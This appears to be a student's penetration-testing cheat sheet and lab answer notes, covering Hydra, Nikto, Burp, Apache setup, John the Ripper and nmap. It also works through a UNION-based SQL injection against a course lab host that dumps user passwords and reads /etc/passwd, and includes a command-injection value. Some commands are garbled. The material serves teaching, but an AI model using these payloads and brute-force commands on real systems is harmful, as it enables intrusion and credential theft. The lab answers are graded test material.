# Table of Contents

 1. Exploits 
 2. Command Injection
 3. Password Cracking
 4. Web Application Testing

### Exploits 

#### Server-side
##### Windows 
 - MS 03-026
 - MS 04-011
 - MS 08-067 (CVE-2008-4250)
 - MS 17-010 (CVE-2017-0144)
##### OpenSSL
- MS 03-026


## Command Injection

    perl -MURI::Escape -le 'print uri_escape shift' '|ls -l test.cgi'


## Password Cracking

### Wordlists
You can manipulate wordlists to fit policy using **pw-inspector**.

*flags*:

-i		input file

-o	output file

-m	minimum length

-M 	maximum length

-c minimum number of the following policy criteria 

-l lowercase

-u uppercase

-n numeric

-p printable character

-s special character

**example:**

    cat rockyou.txt | pw-inspector -m 10 -n -u -l -p 3 -c3

 You can generate wordlists from web pages using **cwel**
*flags*:

-d depth

-m	minimum length

-w 	maximum length

**example:**

    cat --d 0 - m3 -w testwords.txt http://thecyberacademy.org


### Online Password Guessing 

#### Hydra
You can crack passwords online using **Hyrdra** (or Gui version **xHydra**).

*notes*:
- Hydra uses 16 threads default.
- View [*Step 7*](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/) to see how to do login forms.
- View [*Github*](https://github.com/vanhauser-thc/thc-hydra) page for more detailed instructions (may be too new).
- View *[Kali Tools](https://tools.kali.org/password-attacks/hydra)* page for man page like details.
- View *[Blog post](https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/)* for further detailed examples.

*flags*:
-l		singular username
-L	 username file
-P	password file
-t	threads

**example:**

    hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 ssh 


## Web Application Testing

### Scanning for Vulnerabilities

#### Nikto
You can use **Nikto** to perform an advance scan of a web server.

*flags*:

-host		host obviously

**example:**

    nikto -host 192.168.1.5

### Finding Content
#### DirBuster
You can use **DirBuster** to perform a brute-force attack to identify.

*note*:
use the *directory-list-small* wordlist.

### Intercepting Proxy

#### Burpsuite
You can use **Burpsuite** to perform an advance scan of a web server.

*note*:
You must enable *Manual Proxy Configuration* on Iceweasel via *Edit>Preferences and select Advanced and Network*. Then when navigating you must click *FORWARD* on proxy menu of *burpsuite*. 

*instructions*:

Kali

Apache Wk8a

Q1: Each time you make a configuration change to the Apache server you must restart (or at the very least reload) the http service. Remember to start apache for the first time do:
A: service apache2 start
   service apache2 reload

Q2: Enable the userdir feature by doing
		a2enmod userdir
		service apache2 restart
	To demonstrate this feature, create a user called "dave".
		adduser dave
		su - dave (Ctrl D logs you out of current user)
	Create a public_html directory in dave's home directory, and create a file hello.html in the public_html. The contents of this file should be: 
		mkdir public_html
	 The "/home/dave" and "/home/dave/public_html" must be executable by others, and the "/home/dave/public_html/hello.html" file must be readable by other. This should be the default. However if needed you can always do this manually:
		chmod 701 /home/dave /home/dave/public_html
		chmod o+r /home/dave/public_html/hello.html
	You can direct your browser to see this page by using the URL
		http://yourmachinename/~dave/hello.html
	Replace "yourmachinename" with the output of running the "hostname" command, eg
		[root@host-19-17 dave]# hostname

Q3:  Create the following directories, owned by dave (so su - dave first), each of which must be executable for other:
A:  su dave
    mkdir /home/dave/public_html/web
    mkdir /home/dave/public_html/vm
	
Q4: 
A: <VirtualHost *:80>
    ServerAdmin me@jamie.org
    DocumentRoot /home/dave/public_html/web/
	ServerName web-5-97.linuxzoo.net
   </VirtualHost>


SQL Injection WK9

Q2: What is the HTTP method used to get the price of eggs? GET ("ctrl shift e" for network dev options in firefox)
	What is the form variable name used in generating the eggs information? variable name: code

Q: How many different items are stored in the database?
	number of items: 6
   What is the name of the item with the highest code number?
	item name: radio

Q: Number of columns that it confirms in the SQL query: Column number: 4
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20--%20
   code=' UNION SELECT NULL, NULL, NULL, NULL --%20 (iterate with more and more NULL until achieved)

Q: Combine your previous SQL injection with a "from TABLENAME", where the TABLENAME needs to be guessed. As this is all about stock and inventory, try one of the following tablename candidates:
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL%20from%20inventory%20--%20
   code=' UNION SELECT NULL, NULL, NULL, NULL from inventory --%20
   
Q: Combine your previous SQL injection and replace one of the NULL entries with a guess as to the item codes column name. Try the following candidates: 
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20id,%20NULL,%20NULL,%20NULL%20from%20inventory%20--%20
   code=' UNION SELECT id, NULL, NULL, NULL from inventory --%20

Q: Combine your previous SQL injection and replace another one of the NULL entries with a guess as to the item codes column name. As this is about stock it seems plausable that the missing column is about how much stock is available. Try the following candidates: 
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20id,%20instock,%20NULL,%20NULL%20from%20inventory%20--%20
   code=' UNION SELECT id, instock, NULL, NULL from inventory --%20
   
Q: How much milk is in stock? 
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20OR%201=1%20UNION%20SELECT%20id,%20instock,%20NULL,%20NULL%20OR%201=1%20from%20inventory%20--%20
   ' OR 1=1 UNION SELECT id, instock, NULL, NULL OR 1=1 from inventory --%20
   
Q: Use the first attribute and find out the name of the database (i.e. the schema name) which we are using. This is a mysql function. database schema name: hack
A: http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20database(),%20NULL,%20NULL,%20NULL%20--%20
   ' UNION SELECT database(), NULL, NULL, NULL --%20

Q: With the database name and your SQL injection, select the "table_name" from "information_schema.tables", restricting your query to those which have the "table_schema" set to the database name identified above. 
A: Number of tables: 3 Likely table name of the application users: theusers
   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20table_name,%20NULL,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema=%27hack%27%20--%20
   code=' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='hack' --%20

Q: Using "information_schema.columns", what are the column names of the table which you suspect of being the user information table in this database schema? In your query restrict the injected query to only the correct table_schema and table_name. 
A: Column 1: name Column 2: pwd
   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20table_schema,%20table_name,%20column_name,%20NULL%20FROM%20information_schema.columns%20WHERE%20table_schema=%27hack%27%20AND%20table_name=%27theusers%27--%20
   code=' UNION SELECT table_schema, table_name, column_name, NULL FROM information_schema.columns WHERE table_schema='hack' AND table_name='theusers'--%20

Q: Now extend your original SQL injection, using the name of the application user's table and the newly discovered column names to access the application's user table information. 
A: What is the password for user "clever"? password: jupasdads
   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20UNION%20SELECT%20%27%27,%20CONCAT(name,%20%27%20%27,%20pwd),%20NULL,%20NULL%20FROM%20hack.theusers--%20
   code=' UNION SELECT '', CONCAT(name, ' ', pwd), NULL, NULL FROM hack.theusers--%20

Q:  Again extending your original SQL injection, make use of the LOAD_FILE function to access /etc/passwd. The password file has the following repeating format: username:x:userid:groupid:/home:/bin/bash
A: Using this information, what is the first username seen in /etc/passwd using this injection? username: root
   http://host-5-1.linuxzoo.net/cgi-bin/stock.pl?code=%27%20union%20select%201,load_file(%27/etc/passwd%27),3,4%20%20--%20
   ' union select 1,load_file('/etc/passwd'),3,4 --%20
   
   
Password Attacks Wk10

Q2: What is the md5 encoding of the string "password"? encoding: 
A: echo -n password | md5sum | cut -f1 -d" " 
   5f4dcc3b5aa765d61d8327deb882cf99
   
Q: How is the md5 encoded, and how many bits does this represent? 
A: Encoding: Hex
   bits: 128
   
Q: This command, ./hex.pl, takes 1 parameter. This is a hex encoded md5 password. Try running ./hex.pl with the md5 hex from the question above where you calculated the md5 of "password".
	How many tries did it take to crack the code. tries: 3
A: ./hex.pl 5f4dcc3b5aa765d61d8327deb882cf99

Q: Extend the search to try the dictionary words in hex.pl but with the numbers 0-9 appended to them. So edit hex.pl, and replace all lines after "my tries=0" with: line add:
A: 38 (code results in 39 due to error)

Q: Extend the search to try the dictionary words in hex.pl but with the numbers 0-999 appended to them.
A: What is the password?
	password: tasty500
	tries: 3011 (code results in 3012 but theres an error)
	
Q: Assuming that you had a small dictionary of 20 words, and looked at the permutations of the password being any one of those words, either as it is or with numbers ranging from 0 to 9999, then consider the implications of this.
A: How many permutations would that be? permutations: 200,020
   Which of these is most true? B,E
   
Q3: First locate john's password.lst file. Use the find command for this. Note the "lst" is "L S T", and not a "one". If you find more than one, choose the SHORTEST path.
A:  locate password.lst
	Full path of password.lst: /usr/share/john/password.lst

Q: Examine the example1.sam file. What hashes does it contain?
A: cat example1.sam
   john example1.sam
   
Q: Crack with John The Ripper the example1.sam file. Use it in "wordlist" mode, and use the full path of password.lst. Use the "lm" format, as this is faster to crack... Apply "john" to example1.sam.
A: john --wordlist example1.sam

Q: Use "john --show example1.sam" and evaluate its attempt. Passwords are CASE SENSITIVE in the checks!
A: What is the password of "gordon": OXFORD What is wrong with the password of "Administrator": Only cracked the first half of LM

Q: Switch to John The Ripper in "incremental" mode, and apply it to example1.sam. Use the show mode and identify the password of Administrator. Passwords are CASE SENSITIVE in the checks!
A:  What is the password of "administrator":  PASSWORD123

Q4:  Target 1 lies somewhere in 192.168.1.1 - 192.168.1.254. This time use "ip route show" and find out the device name on your machine which would be used to handle packets going to target 1. 
A: Target network device: br0

Q: What is your machine's IP number on the target network? 
A: Your IP: 192.168.1.254

Q: Use nmap to sweep the target network, and identify the IP address of target 1. 
A:  nmap 192.168.1.0/24
	Target IP: 192.168.1.1
	
Q: Scan port 22 of the target using nmap in application fingerprinting mode. 
A: nmap 192.168.1.1 -p 22 -sV
   SSH Server version?: OpenSSH 4.7p1
   
Q: What is the password for "user"? 
A: password: user

Q:  Repeat the process, but this time crack the user account "klog". 
A: What is the password for "klog"? password: 123456789

Q: What is the password for "sys"?
	password: batman
How many attempts dit it take to find the password?
	attempts: 201



